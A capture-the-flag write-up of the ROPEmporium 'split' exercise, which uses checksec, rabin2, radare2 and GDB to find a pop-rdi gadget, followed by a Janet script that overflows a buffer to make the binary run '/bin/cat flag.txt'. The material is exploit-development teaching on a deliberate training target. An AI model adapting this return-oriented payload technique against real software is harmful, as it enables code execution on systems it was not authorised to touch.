# ROPEmporium - Split (Challenge 2)

```sh
checksec --file=split
# RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
# Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   70 Symbols     No       0               3       split

# alternatively:

rabin2 -I split
# ...
# nx       true
# ...
```

We see `NX` is enabled, meaning we can't execute any code on the stack.

We can look at the `.data` and `.rodata` sections using:

```sh
rabin2 -z split
# [Strings]
# nth paddr      vaddr      len size section type  string
# ―――――――――――――――――――――――――――――――――――――――――――――――――――――――
# 0   0x000007e8 0x004007e8 21  22   .rodata ascii split by ROP Emporium
# 1   0x000007fe 0x004007fe 7   8    .rodata ascii x86_64\n
# 2   0x00000806 0x00400806 8   9    .rodata ascii \nExiting
# 3   0x00000810 0x00400810 43  44   .rodata ascii Contriving a reason to ask user for data...
# 4   0x0000083f 0x0040083f 10  11   .rodata ascii Thank you!
# 5   0x0000084a 0x0040084a 7   8    .rodata ascii /bin/ls
# 0   0x00001060 0x00601060 17  18   .data   ascii /bin/cat flag.txt
```


With `radare2` we analyze helpful functions (once we found a good cheat sheet
for its many cryptic commands):

```
aa  # Analyze all

afl # print function offsets
# 0x004006e8    1 90           sym.pwnme
# 0x00400742    1 17           sym.usefulFunction
# ...

pdf @0x00400742 # disassemble usefulFunction
# ┌ 17: sym.usefulFunction ();
# │           0x00400742      55             push rbp
# │           0x00400743      4889e5         mov rbp, rsp
# │           0x00400746      bf4a084000     mov edi, str.bin_ls         ; 0x40084a ; "/bin/ls"
# │           0x0040074b      e810feffff     call sym.imp.system         ; int system(const char *string)
# │           0x00400750      90             nop
# │           0x00400751      5d             pop rbp
# └           0x00400752      c3             ret
```

We learn from the disassembly that `main` calls a `pwnme` function which is
susceptible to a buffer overflow.
The `usefulFunction` function contains a call to `system()` but with the wrong
argument:
It passes the "/bin/ls" string to `system()` instead of the "/bin/cat flag.txt"
string.

This argument is passed using the `RDI` register.
We could manually search for a gadget, or just let `radare2` do the work for us:

```sh
r2 split
# > /R pop rdi
# 0x004007c3                 5f  pop rdi
# 0x004007c4                 c3  ret
```

So we overwrite the stack in a way that `pwnme` will return to `0x004007c3`
and then pop the address of "/bin/cat flag.txt" string into RDI.
Next, the `ret` has to return to `0x0040074b` (taken from the disassembly)
where our `system()` call is located.

The following script should do the trick:

```janet
#!/usr/bin/env janet
(use sh)

(def payload
  (string/join
   [(string/repeat 'A 40)              # garbage to get to the ret address
    "\xC3\x07\x40\x00\x00\x00\x00\x00" # pop rdi; ret gadget
    "\x60\x10\x60\x00\x00\x00\x00\x00" # pop "/bin/cat flag.txt" string addr into r13
    "\x4B\x07\x40\x00\x00\x00\x00\x00" # jump to 0x0040074b -- system(edi)
    ]))

(let [len (length payload)]  # [1]
  (if (<= len 96)
    (print "length ok: " len)
    (print "Warning! Payload truncated after 96 bytes (current length: " len ")")))

(spit "payload.txt" payload) # [2]
($ ./split < ,payload)       # [3]
```

- [1] From the disassembly we know that the buffer has enough space for 32
  bytes, but up to 96 bytes are read in.
  I put this check there when testing the exploit to make sure, I don't
  accidentally write a payload that is too large.
- [2] Write the payload to a file so that I can use it eg. from within GDB.
- [3] Run the binary reading the payload, to test if it works.

## Debugging with GDB

While developing the exploit it is often helpful to get some more insight
into what is going on, eg. by using a debugger.

```
gdb ./split
b *0x004007c3   # set a breakpoint at address
r < payload.txt # run app reading in from payload.txt
start < payload.txt # same as above, but with automatic breakpoint in `main`
starti          # same again, but with breakpoint in `_start`
x/x $rsp        # print hex value of stack pointer
x/s $edi        # print string pointed to by edi
display/15i $rip # print the next 15 instructions on every step
layout asm      # show the disassembly in a separate window
c               # continue to next breakpoint
ni              # next instruction (skip function calls)
si              # step instruction (go into function calls)
disassemble pwnme # show disassembly of the pwnme function
```
